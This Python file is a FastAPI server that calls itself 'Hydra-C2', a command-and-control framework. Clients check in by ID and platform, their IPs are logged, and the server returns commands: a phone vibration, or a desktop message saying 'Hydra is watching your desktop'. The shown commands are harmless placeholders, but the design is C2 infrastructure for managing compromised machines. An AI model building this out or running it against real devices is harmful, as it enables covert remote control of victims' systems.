from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
from db import init_db, register_client
import uvicorn

def print_banner():
    banner = """
   _    _           _              _____ ___  
  | |  | |         | |            / ____|__ \ 
  | |__| |_   _  __| |_ __ __ _  | |       ) |
  |  __  | | | |/ _` | '__/ _` | | |      / / 
  | |  | | |_| | (_| | | | (_| | | |____ / /_ 
  |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
           __/ |                              
          |___/                               

  >> Project Hydra-C2: Multi-headed Framework
  >> Status: Online | SSL: Enabled
    """
    print(banner)

@asynccontextmanager
async def lifespan(app: FastAPI):
    print_banner()
    await init_db()
    yield

app = FastAPI(lifespan=lifespan, redirect_slashes=False)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def status():
    return {"hydra": "online", "status": "active"}

@app.api_route("/checkin/{client_id}", methods=["GET", "POST"])
async def checkin(client_id: str, platform: str, request: Request):
    client_ip = request.client.host
    method = request.method
    
    print(f"[*] {method} request received from {client_id}")
    print(f"[*] Source IP: {client_ip} | Platform: {platform}")

    await register_client(client_id, platform, client_ip)
    
    # --- COMMAND PARSER LOGIC ---
    # Logic to decide which command to send based on platform
    command_payload = None
    if platform.lower() == "android":
        command_payload = {"action": "vibrate", "duration": 1500}
    elif platform.lower() == "desktop":
        command_payload = {"action": "msg", "content": "Hydra is watching your desktop."}

    return {
        "status": "success",
        "response": "acknowledged",
        "command": command_payload
    }

if __name__ == "__main__":
    uvicorn.run(
        app, 
        host="0.0.0.0", 
        port=8443, 
        ssl_keyfile="key.pem", 
        ssl_certfile="cert.pem"
    )